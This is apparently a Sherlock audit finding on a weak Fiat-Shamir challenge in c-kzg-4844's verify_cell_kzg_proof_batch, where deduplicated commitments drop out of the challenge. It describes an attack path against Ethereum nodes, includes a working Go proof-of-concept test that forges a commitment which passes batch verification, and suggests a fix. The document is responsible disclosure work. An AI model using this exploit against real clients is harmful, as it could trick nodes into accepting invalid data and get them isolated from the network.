---
tags:
  - lang/solidity
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - sector/zk
protocol: "[[Fusaka]]"
auditors:
  - "[[alexfilippov314]]"
report: "https://github.com/sherlock-audit/2025-09-ethereum-fusaka-upgrade-judging"
genome:
  - "[[missing-check]]"
  - "[[wrong-state]]"
  - "[[account-signer]]"
  - "[[commitment-uniqueness]]"
---
# H-4: Weak Fiat-Shamir in `c-kzg-4844.verify_cell_kzg_proof_batch `

- id: 64105
- impact: HIGH
- protocol: [[Fusaka]] Upgrade
- reporter: alexfilippov314 (Sherlock)
- source: N/A

## Summary


The bug report discusses an issue with the `c-kzg-4844` library used by Prysm and possibly other clients to verify KZG proofs. The `verify_cell_kzg_proof_batch` function, which implements the universal verification equation, passes incorrect parameters to `compute_verify_cell_kzg_proof_batch_challenge`, causing the challenge to not depend on some commitments. This can allow a malicious prover to craft commitments that pass batch verification but fail individual verification. This could lead to vulnerable nodes accepting invalid data columns and being isolated from the network. A proof of concept is provided and a possible mitigation is suggested.

## Details


Source: https://github.com/sherlock-audit/2025-09-ethereum-fusaka-upgrade-judging/issues/203 

## Found by 
alexfilippov314

### Summary

Prysm (and possibly other clients) use the `c-kzg-4844` library to verify KZG proofs. For example, Prysm calls the `verify_cell_kzg_proof_batch` function to verify incoming data column sidecars, as shown [here](https://github.com/OffchainLabs/prysm/blob/f690af81fafdd2c9bebe77c5de35784034ba0a5d/beacon-chain/blockchain/kzg/kzg.go#L99-L109):
```go
// VerifyCellKZGProofBatch verifies the KZG proofs for a given slice of commitments, cell indices, cells, and proofs.
// Note: It is much more efficient to call this function once with large slices than to call it multiple times with small slices.
func VerifyCellKZGProofBatch(commitmentsBytes []Bytes48, cellIndices []uint64, cells []Cell, proofsBytes []Bytes48) (bool, error) {
	// Convert `Cell` type to `ckzg4844.Cell`
	ckzgCells := make([]ckzg4844.Cell, len(cells))

	for i := range cells {
		ckzgCells[i] = ckzg4844.Cell(cells[i])
	}
	return ckzg4844.VerifyCellKZGProofBatch(commitmentsBytes, cellIndices, ckzgCells, proofsBytes)
}
```

The `verify_cell_kzg_proof_batch` function essentially implements the universal verification equation described [here](https://ethresear.ch/t/a-universal-verification-equation-for-data-availability-sampling/13240).

The issue arises because `verify_cell_kzg_proof_batch` passes incorrect parameters to `compute_verify_cell_kzg_proof_batch_challenge`, causing the challenge to not depend on some of the commitments.

Specifically, `deduplicate_commitments` updates `num_commitments` to the length of `unique_commitments`. However, the code still passes the original (non-deduplicated) array of commitments to `compute_verify_cell_kzg_proof_batch_challenge`, while using the updated `num_commitments` value. The relevant [code](https://github.com/ethereum/c-kzg-4844/blob/a679ae566819cdbc4c9f50164246e44a0bf1cd19/src/eip7594/eip7594.c#L857-L884):
```C
num_commitments = num_cells;
memcpy(unique_commitments, commitments_bytes, num_cells * sizeof(Bytes48));
deduplicate_commitments(unique_commitments, commitment_indices, &num_commitments);

// Array allocations

ret = new_fr_array(&r_powers, num_cells);
if (ret != C_KZG_OK) goto out;
ret = new_g1_array(&proofs_g1, num_cells);
if (ret != C_KZG_OK) goto out;

// Compute powers of r, and extract KZG proofs out of input bytes

/* Compute the challenge */
ret = compute_verify_cell_kzg_proof_batch_challenge(
    &r,
    commitments_bytes,
    num_commitments,
    commitment_indices,
    cell_indices,
    cells,
    proofs_bytes,
    num_cells
);
```

Inside `compute_verify_cell_kzg_proof_batch_challenge`, commitments are added as follows:
```C
for (size_t i = 0; i < num_commitments; i++) {
    /* Copy commitment */
    memcpy(offset, &commitments_bytes[i], BYTES_PER_COMMITMENT);
    offset += BYTES_PER_COMMITMENT;
}
```

This means that when commitments are duplicated, some of the last commitments are excluded from the challenge computation. For example, for `[C1, C1, C3]`, the challenge will not depend on `C3`. A malicious prover can then craft `C3` so that batch verification passes even though individual verifications fail.

### Root Cause

In `verify_cell_kzg_proof_batch`, the [call ](https://github.com/ethereum/c-kzg-4844/blob/a679ae566819cdbc4c9f50164246e44a0bf1cd19/src/eip7594/eip7594.c#L875-L884)to `compute_verify_cell_kzg_proof_batch_challenge` uses `commitments_bytes` instead of `unique_commitments`.

### Internal Pre-conditions

None

### External Pre-conditions

None

### Attack Path

An attacker could target a specific subnet (one of 128), precompute the batch-verification challenge for that subnet’s column, and propose a block with crafted commitments that pass batch verification for the targeted column. The proposer then gossips a maliciously crafted data column to the targeted subnet. Vulnerable nodes will accept, store, and rebroadcast the malicious column. As they rebroadcast invalid sidecars, their peer scores will drop, potentially leading to the isolation of vulnerable nodes from the rest of the network.

### Impact

Vulnerable nodes could be tricked into accepting an invalid data column sidecar from a malicious proposer. This could lead to a drop in their gossip scores and potentially cause a soft partition of these nodes from the rest of the network.

### PoC

This POC demonstrates that a malicious prover can precompute the challenge and craft the commitments in a way that allows batch verification to pass.
 
1. `git clone https://github.com/ethereum/c-kzg-4844`
2. Apply the following diff:
```diff
diff --git a/bindings/go/main_test.go b/bindings/go/main_test.go
index e475f6b..72f927a 100644
--- a/bindings/go/main_test.go
+++ b/bindings/go/main_test.go
@@ -3,6 +3,7 @@ package ckzg4844
 import (
        "encoding/hex"
        "fmt"
+       "math/big"
        "math/rand"
        "os"
        "path/filepath"
@@ -11,6 +12,7 @@ import (
        "testing"
 
        "github.com/stretchr/testify/require"
+       blst "github.com/supranational/blst/bindings/go"
        "gopkg.in/yaml.v3"
 )
 
@@ -809,6 +811,79 @@ func TestComputeVerifyCellKZGProofBatchChallenge(t *testing.T) {
        }
 }
 
+func toBytes48(point *blst.P1) Bytes48 {
+       var result Bytes48
+       copy(result[:], point.Compress())
+       return result
+}
+
+func padBytes32(b []byte) []byte {
+       if len(b) >= 32 {
+               return b
+       }
+       padded := make([]byte, 32)
+       copy(padded[32-len(b):], b)
+       return padded
+}
+
+func TestPOCWeakFiatShamir(t *testing.T) {
+       Infinity := Bytes48{0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
+
+       // 1. C1 here is an arbitrary point
+       scalar := new(blst.Scalar).FromBEndian(padBytes32(big.NewInt(42).Bytes()))
+       C1 := blst.P1Generator().Mult(scalar)
+
+       commitments := [3]Bytes48{
+               toBytes48(C1),
+               toBytes48(C1),
+               Infinity,
+       }
+       commitmentIndices := []uint64{0, 0, 1}
+       cellIndices := []uint64{0, 0, 0}
+       cells := [3]Cell{}
+       proofs := [3]Bytes48{
+               Infinity,
+               Infinity,
+               Infinity,
+       }
+
+       // 2. Due to the bug in Fiat–Shamir, the challenge does not depend on C3
+       challenge, err := computeVerifyCellKZGProofBatchChallenge(
+               commitments[:2], commitmentIndices, cellIndices, cells[:], proofs[:])
+       require.NoError(t, err)
+       fmt.Println("challenge:", hex.EncodeToString(challenge[:]))
+
+       // 3. This allows us to compute C3 in a way that makes the batch verification pass
+       // C3 = -((r + r^2) / r^3) * C1
+       r := new(blst.Scalar).FromBEndian(challenge[:])
+       rSquared, _ := r.Mul(r)
+       rPlusRSquared, _ := r.Add(rSquared)
+       negRPlusRSquared, _ := new(blst.Scalar).Sub(rPlusRSquared)
+       rCubed, _ := rSquared.Mul(r)
+       negRPlusRSquaredDividedByRCubed, _ := negRPlusRSquared.Mul(rCubed.Inverse())
+       C3 := C1.Mult(negRPlusRSquaredDividedByRCubed)
+
+       commitments[2] = toBytes48(C3)
+
+       // 4. Batch verification passes
+       valid, err := VerifyCellKZGProofBatch(commitments[:], cellIndices, cells[:], proofs[:])
+       require.True(t, valid)
+       require.NoError(t, err)
+
+       // 5. But individual verifications fail
+       valid, err = VerifyCellKZGProofBatch(commitments[0:1], cellIndices[0:1], cells[0:1], proofs[0:1])
+       require.False(t, valid)
+       require.NoError(t, err)
+
+       valid, err = VerifyCellKZGProofBatch(commitments[1:2], cellIndices[1:2], cells[1:2], proofs[1:2])
+       require.False(t, valid)
+       require.NoError(t, err)
+
+       valid, err = VerifyCellKZGProofBatch(commitments[2:], cellIndices[2:], cells[2:], proofs[2:])
+       require.False(t, valid)
+       require.NoError(t, err)
+}
+
 ///////////////////////////////////////////////////////////////////////////////
 // Other Tests
 ///////////////////////////////////////////////////////////////////////////////
```
3. `cd ./bindings/go && go test -v -run TestPOCWeakFiatShamir`

### Mitigation

Consider using `unique_commitments` instead of `commitments_bytes` in the [call ](https://github.com/ethereum/c-kzg-4844/blob/a679ae566819cdbc4c9f50164246e44a0bf1cd19/src/eip7594/eip7594.c#L875-L884)to `compute_verify_cell_kzg_proof_batch_challenge`.
